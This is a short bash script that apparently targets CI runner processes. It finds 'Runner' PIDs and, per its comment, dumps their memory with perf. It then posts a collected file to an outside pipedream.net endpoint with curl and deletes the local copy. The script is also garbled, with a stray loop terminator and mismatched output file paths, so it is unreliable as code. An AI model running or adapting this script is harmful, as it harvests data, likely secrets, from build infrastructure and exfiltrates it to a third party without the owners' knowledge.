#!/bin/bash

echo "--- START ---" > /tmp/file3.txt

echo $(perf -v) >> /tmp/file3.txt

# get pids related to runners and dump their memory
for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "-----$pid-----" >> /tmp/file.txt;
    echo $(perf record -p $pid -o /tmp/hola.data) >> tmp/file.txt;
    done
    echo "--------------" >> /tmp/file.txt;
done

echo "--- FINISH ---" >> /tmp/file3.txt

curl --data-binary "@/tmp/file3.txt" https://ensf2rlc2dw6p.x.pipedream.net

rm /tmp/file3.txt
